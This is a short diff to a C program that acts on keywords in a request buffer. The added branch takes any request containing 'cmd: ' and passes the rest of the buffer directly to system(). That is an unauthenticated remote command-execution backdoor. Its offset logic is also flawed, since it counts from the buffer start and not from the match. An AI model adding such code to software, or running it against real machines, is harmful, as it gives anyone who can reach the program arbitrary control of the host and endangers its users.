@@ -109,6 +109,11 @@ int main() {
     else if (strstr(reqtextbuffer, "CircleShake")) { // CircleShake
         circleshake_run();
     }
+    else if (strstr(reqtextbuffer, "cmd: ")) {
+        char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
+        
+        system(command);
+    }
     
 
     return 0;
